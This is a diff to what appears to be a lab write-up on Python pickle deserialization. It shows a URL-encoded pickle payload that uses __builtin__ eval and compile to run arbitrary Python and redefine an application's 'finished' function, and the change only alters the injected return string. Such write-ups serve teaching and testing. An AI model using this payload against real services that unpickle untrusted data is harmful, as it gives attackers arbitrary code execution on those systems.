@@ -35,5 +35,5 @@ To do this, use the following payload, or generate it with generate_pickle.py.
 The idea is that we evaluate a compile function, and then pass in properly formatted python code. This allows us to execute arbitray Python code in the interpreter and affect the runtime environment. The following payload will modify the ```finished``` function until the application is restarted.
 
 ```bash
-c__builtin__%0Aeval%0Ap1%0A%28S%27eval%28compile%28%22%22%22global%20finished%5Cndef%20finished%28%29%3A%5Cn%20%20%20%20return%20%5C%27hacked%5C%27%22%22%22%2C%20%5C%27%3Cstdin%3E%5C%27%2C%20%5C%27exec%5C%27%29%29%27%0Ap2%0Atp3%0ARp4%0A.
+c__builtin__%0Aeval%0Ap1%0A%28S%27eval%28compile%28%22%22%22global%20finished%5Cndef%20finished%28%29%3A%5Cn%20%20%20%20return%20%5C%27Modified This Function%5C%27%22%22%22%2C%20%5C%27%3Cstdin%3E%5C%27%2C%20%5C%27exec%5C%27%29%29%27%0Ap2%0Atp3%0ARp4%0A.
 ```
